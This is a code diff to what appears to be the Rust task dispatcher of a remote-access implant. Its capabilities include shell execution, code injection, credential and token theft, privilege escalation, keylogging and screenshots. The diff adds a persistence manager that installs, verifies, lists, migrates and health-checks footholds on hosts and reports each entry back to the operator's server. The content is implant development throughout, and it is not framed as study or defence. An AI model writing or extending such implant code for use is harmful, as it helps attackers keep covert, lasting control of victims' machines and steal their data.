@@ -30,7 +30,8 @@ pub fn capabilities() -> Vec<&'static str> {
         "shell", "exec", "sysinfo", "recon", "pwd", "cwd", "ls", "tail", "hash",
         "download", "cat", "upload", "ps", "proc.kill", "sleep", "exit", "kill",
         "ping", "tunnel", "p2p", "bof", "ext", "inject", "creds", "token",
-        "privesc", "persist", "unpersist", "update", "registry", "screenshot",
+        "privesc", "persist", "unpersist", "persist.list", "persist.verify",
+        "persist.migrate", "persist.health", "update", "registry", "screenshot",
         "clipboard", "keylog", "keylog.file", "triage", "find", "netinfo",
         "session.open", "session.input", "session.close", "vpn", "scan",
         "resolve", "env", "touch",
@@ -70,6 +71,20 @@ impl Outcome {
             fields.push((*k, v.clone()));
         }
         upk::map(fields)
+    }
+}
+
+/// The result of a persistence task.
+///
+/// The report is what the operator reads; the entries are what the server
+/// keeps, and the two counters are what turn a broken entry into an alert.
+fn persistence(result: Result<crate::persist::Report, String>) -> Outcome {
+    match result {
+        Ok(report) => Outcome::ok(report.text.into_bytes())
+            .with("persist", upk::arr(report.entries))
+            .with("persist_total", upk::u(report.total))
+            .with("persist_broken", upk::u(report.broken)),
+        Err(e) => Outcome::err(1, e),
     }
 }
 
@@ -485,15 +500,19 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
             Err(e) => Outcome::err(1, e),
         },
 
-        // ---- installing and updating -------------------------------------
-        "persist" => match crate::install::persist(&args) {
-            Ok(report) => Outcome::ok(report.into_bytes()),
-            Err(e) => Outcome::err(1, e),
-        },
-        "unpersist" => match crate::install::unpersist(&args) {
-            Ok(report) => Outcome::ok(report.into_bytes()),
-            Err(e) => Outcome::err(1, e),
-        },
+        // ---- persistence -------------------------------------------------
+        //
+        // The persistence manager owns the whole lifecycle: it installs a
+        // technique, verifies that it is really there, lists what is on the
+        // host, moves from one technique to another and takes everything away
+        // again.  The entries travel with the result, so the server knows
+        // what is installed on every host.
+        "persist" => persistence(crate::persist::install(&args)),
+        "unpersist" => persistence(crate::persist::remove(&args)),
+        "persist.list" => persistence(crate::persist::list(&args)),
+        "persist.verify" => persistence(crate::persist::verify(&args)),
+        "persist.migrate" => persistence(crate::persist::migrate(&args)),
+        "persist.health" => persistence(crate::persist::health(&args)),
         "update" => match crate::install::update(&args) {
             Ok(report) => Outcome::ok(report.into_bytes()),
             Err(e) => Outcome::err(1, e),
